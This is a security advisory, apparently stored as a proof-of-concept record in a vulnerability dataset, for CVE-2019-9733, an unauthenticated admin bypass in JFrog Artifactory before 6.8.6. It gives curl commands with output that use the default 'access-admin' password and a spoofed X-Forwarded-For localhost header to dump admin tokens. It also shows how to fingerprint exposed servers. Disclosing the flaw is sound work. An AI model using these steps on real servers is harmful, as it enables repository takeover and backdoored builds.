{
    "text": "vul_name : JFrog Artifactory Administrator Authentication Bypass ， vul_cve : CVE-2019-9733 ， vul_poc : CipherTechs Inc - Security Advisory ， JFrog Artifactory Administrator Authentication Bypass ， Introduction ， JFrog Artifactory ( is a popular universal artifact repository manager commonly used by software developers. CipherTechs' Red Team discovered a high risk vulnerability that allows unauthenticated remote attackers to obtain administrative access to Artifactory servers and assume control of all stored artifacts and builds. ， CVE ， CVE-2019-9733 ， Affected Platforms and Versions ， Product : JFrog Artifactory ， Version : < 6.8.6 ， Vulnerability Overview ， Security risk : Critical ， Attack vector : Remote ， Vendor Status : Fixed in version 6.8.6 released March 12 , 2019 ， Vulnerability Description ， Artifactory has an account that can be used to reset the admin account password from localhost. ， By providing the HTTP header X-Forwarded-For it is possible to bypass Artifactorys whitelist allowed_ips. ， Accessing the internal \"password reset\" admin account exposes the primary admin account's access token allowing an attacker to obtain admin access to the Artifactory server without disrupting other users' access. ， This vulnerability is exploitable in most configurations including when an external SSO provider such as Okta or Onelogin is used. ， Technical details ， Artifactorys documentation [ 1 ] states that a default account , access-admin , is present and can be used to reset the admin users password. CipherTechs used curl to see if the access-admin account was present and had the default password of password. ，  $ curl -ks -u access-admin : password { ， \"errors\" :  [ { ， \"code\" : \"FORBIDDEN\" ,  ， \"message\" : \"User 'access-admin' is not allowed to login from remote address :  [ IP REDACTED ] \" ， } ]  ， } ， The error message shows that the credential access-admin : password is valid , but not allowed to login remotely. CipherTechs bypassed this measure by providing a X-Forwarded-For HTTP header and set it to 127.0.0.1 ( localhost ) . ，  $ curl -ks -H 'X-Forwarded-For : 127.0.0.1' -u access-admin : password | jq . ， { ， \"users\" :  [  ， { ， \"username\" : \"access-admin\" ,  ， \"realm\" : \"internal\" ,  ， \"status\" : \"enabled\" ,  ， \"allowed_ips\" :  [  ， \"127.0.0.1\" ，  ]  ,  ， \"created\" : \"2019-01-19T20 : 00 : 40.327Z\" ,  ， \"modified\" : \"2019-02-14T15 : 55 : 41.052Z\" ,  ， \"last_login_time\" : \"1970-01-01T00 : 00 : 00.000Z\" ,  ， \"custom_data\" : {} ,  ， \"password_expired\" : false ,  ， \"password_last_modified\" : 1518623741047 ,  ， \"groups\" :  [  ]  ， } ,  ， { ， \"username\" : \"admin\" ,  ， \"realm\" : \"internal\" ,  ， \"status\" : \"enabled\" ,  ， \"allowed_ips\" :  [  ， \" * \" ，  ]  ,  ， \"created\" : \"2019-01-19T20 : 01 : 09.806Z\" ,  ， \"modified\" : \"2019-02-14T15 : 38 : 54.481Z\" ,  ， \"last_login_time\" : \"2019-02-20T11 : 53 : 57.973Z\" ,  ， \"last_login_ip\" : \" [ REDACTED ] \" ,  ， \"custom_data\" : { ， \"public_key\" : \" [ REDACTED ] \" ,  ， \"updatable_profile\" : \"true\" ,  ， \"basictoken_shash\" : \" [ REDACTED ] \" ,  ， \"private_key\" : \" [ REDACTED ] \" ,  ， \"artifactory_admin\" : \"true\" ,  ， \"basictoken\" : \" [ REDACTED ] \" ， } ,  ， \"password_expired\" : false ,  ， \"password_last_modified\" : 1518623741101 ,  ， \"groups\" :  [  ]  ，  [ CIPHERTECHS : LONG RESPONSE REMOVED FOR BREVITY. All users , keys , and tokens are returned ]  ， Once authenticated as admin , the full rich Artifactory API was available [ 2 ] and yielded sensitive details. For example , the following request retrieves all builds. ，  $ curl -H\"Authorization : Bearer $ basictoken_value\" -ks ， The admin account has rights to publish artifacts and can overwrite existing files , making it possible for an attacker to backdoor existing artifacts that current and future builds depend on and giving persistent access across all environments and developer workstations. ， Artifactory servers can be discovered by requesting the URI /artifactory/webapp/ and looking for the X-Artifactory-Id HTTP response header. ，  $ curl -I ， HTTP/1.1 200 OK ， Accept-Ranges : bytes ， Cache-Control : no-store , max-age=0 ， Cache-control : no-cache=\"set-cookie\" ， Content-Length : 2239",
    "time": "2019.03.21"
}